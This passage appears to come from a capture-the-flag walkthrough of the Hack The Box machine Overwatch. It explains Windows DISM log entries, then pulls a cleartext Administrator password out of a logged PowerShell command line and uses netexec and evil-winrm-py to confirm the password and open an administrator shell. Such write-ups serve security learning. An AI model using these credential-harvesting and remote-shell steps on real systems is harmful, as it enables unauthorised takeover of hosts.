2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SearchEngine-Client-Package with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature FileAndStorage-Services with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Storage-Services with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature File-Services with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature CoreFileServer with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:44, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCoreFonts-NonCritical-Fonts-MinConsoleFonts with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCoreFonts-NonCritical-Fonts-BitmapFonts with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCoreFonts-NonCritical-Fonts-TrueType with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCoreFonts-NonCritical-Fonts-UAPFonts with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCoreFonts-NonCritical-Fonts-Support with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SystemInsightsManagement with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SystemInsights with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCore-Drivers-General with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature ServerCore-Drivers-General-WOW64 with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Client-ProjFS with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature SystemDataArchiver with CBS state 7(CbsInstallStateInstalled) being mapped to dism state 7(DISM_INSTALL_STATE_INSTALLED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature HypervisorPlatform with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature VirtualMachinePlatform with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature Microsoft-Windows-Subsystem-Linux with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature StorageMigrationServiceManagement with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature StorageMigrationService with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Feature StorageMigrationServiceProxy with CBS state 4(CbsInstallStateStaged) being mapped to dism state 4(DISM_INSTALL_STATE_STAGED) - CDISMPackageFeature::LogInstallStateMapping
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Input parameters: Session: 2 - DismCloseSessionInternal
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 GetReferenceCount hr: 0x0 - CSessionTable::RemoveSession
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Refcount for DismSession= 2s 0 - CSessionTable::RemoveSession
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3372 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3372 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3372 ExecuteLoop: Cancel signaled - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3372 Leave CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   DISM Package Manager: PID=3544 TID=3572 Finalizing CBS core. - CDISMPackageManager::Finalize
2025-05-16 16:05:45, Info                  DISM   DISM Manager: PID=3280 TID=3372 Closing session event handle 0x340 - CDISMManager::CleanupImageSessionEntry
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3372 Leave CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 GetReferenceCount hr: 0x0 - CSessionTable::RemoveSession
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Refcount for DismSession= 1s 0 - CSessionTable::RemoveSession
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Successfully enqueued command object - CCommandThread::EnqueueCommandObject
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3364 ExecuteLoop: CommandQueue signaled - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3364 Successfully dequeued command object - CCommandThread::DequeueCommandObject
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3364 ExecuteLoop: Cancel signaled - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3364 Leave CCommandThread::ExecuteLoop - CCommandThread::ExecuteLoop
2025-05-16 16:05:45, Info                  DISM   PID=3280 TID=3364 Temporarily setting the scratch directory. This may be overridden by user later. - CDISMManager::FinalConstruct
2025-05-16 16:05:45, Info                  DISM   PID=3280 TID=3364 Scratch directory set to 'C:\Windows\TEMP\'. - CDISMManager::put_ScratchDir
2025-05-16 16:05:45, Info                  DISM   PID=3280 TID=3364 DismCore.dll version: 10.0.20348.1 - CDISMManager::FinalConstruct
2025-05-16 16:05:45, Info                  DISM   Initialized Panther logging at C:\Windows\Logs\DISM\dism.log
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3364 Leave CCommandThread::CommandThreadProcedureStub - CCommandThread::CommandThreadProcedureStub
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Deleted g_internalDismSession - DismShutdownInternal
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 Shutdown SessionTable - DismShutdownInternal
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll:                                          - DismShutdownInternal
2025-05-16 16:05:45, Info                  DISM   API: PID=3280 TID=3284 DismApi.dll: <----- Ending DismApi.dll session ----->
```

This session is Windows Defender enumerating server roles. The parent process command line is `"C:\Program Files\Windows Defender\MpCmdRun.exe" -Roles`, which is Defender’s CLI scanner asking the OS which Windows Server roles are installed so it can tailor its scan behavior. It does that by loading `DismApi.dll` and calling the same API behind `Get-WindowsFeature`, against the online image:

```console
Input parameters: ImagePath: DISM_{53BFAE52-B167-4E2F-A258-0A37B57FF845}, WindowsDirectory: (null), SystemDrive: (null) - DismOpenSessionInternal
...[snip]...
Input parameters: Session: 2, Identifier: (null), PackageIdentifier: 0 - DismGetFeaturesInternal
```

`DISM_{53BFAE52-B167-4E2F-A258-0A37B57FF845}` is the well-known GUID for “the running OS”, and `DismGetFeaturesInternal` with no `Identifier` / `PackageIdentifier` means “list every feature in the catalog.”

#### Administrator Credentials

Looking specifically at the log on Overwatch, on my instance there are 154 instances of it logging a parent process:

```console
evil-winrm-py PS C:\windows\logs\dism> (Get-Content dism.log | Select-String "Parent process command line").Count
154
evil-winrm-py PS C:\windows\logs\dism> (Get-Content dism.log | Select-String "Parent process command line" | Select-String -NotMatch wm
iprvse.exe).Count
10
```

All but 10 of them are from `C:\Windows\system32\wbem\wmiprvse.exe - DismInitializeInternal`. The other 10 have a very interesting one:

```console
evil-winrm-py PS C:\windows\logs\dism> Get-Content dism.log | Select-String "Parent process command line" | Select-String -NotMatch "wmiprvse.exe"
...[snip]...
2025-12-31 03:15:21, Info                  DISM   API: PID=2020 TID=596 DismApi.dll: Parent process command line: powershell.exe  -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "C:\Windows\Temp\hygiene.ps1" -TargetAdmin Administrator -pass ReinhardHammer507 -TargetUser sqlmgmt -dhcp -nu -nd  - DismInitializeInternal
...[snip]...
```

`hygiene.ps1` is run from `C:\Windows\Temp` on 2025-12-31 03:15:21, less than a month before the boxes release.

The script is no longer there:

```console
evil-winrm-py PS C:\windows\logs\dism> cat C:\Windows\Temp\hygiene.ps1
Cannot find path 'C:\Windows\Temp\hygiene.ps1' because it does not exist.
```

But the arguments provide a good amount of data:

- `-TargetAdmin Administrator` - The admin username is Administrator.
- `-pass ReinhardHammer507` - A password, likely the target admin.
- `-TargetUser sqlmgmt` - A user’s home directory to check.
- `-dhcp` - The host is configured for DHCP.
- `-nu` - No idea.
- `-nd` - No idea.

This is likely some script that HTB uses to clean up the box, and it ironically left artifacts on the box with the Administrator’s password!

### Shell over WinRM

Even without a full understanding of the original script, I can guess that the password “ReinhardHammer507” might work for the Administrator user, and it does:

```console
oxdf@hacky$ netexec smb S200401.overwatch.htb -u Administrator -p ReinhardHammer507
SMB         10.129.244.81   445    S200401          [*] Windows Server 2022 Build 20348 x64 (name:S200401) (domain:overwatch.htb) (signing:True) (SMBv1:None) (Null Auth:True) (Guest Auth:True)
SMB         10.129.244.81   445    S200401          [+] overwatch.htb\Administrator:ReinhardHammer507 (Pwn3d!)
oxdf@hacky$ netexec winrm S200401.overwatch.htb -u Administrator -p ReinhardHammer507
WINRM       10.129.244.81   5985   S200401          [*] Windows Server 2022 Build 20348 (name:S200401) (domain:overwatch.htb)
WINRM       10.129.244.81   5985   S200401          [+] overwatch.htb\Administrator:ReinhardHammer507 (Pwn3d!)
```

And can give a shell:

```console
oxdf@hacky$ evil-winrm-py -i S200401.overwatch.htb -u Administrator -p ReinhardHammer507
          _ _            _
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'S200401.overwatch.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```
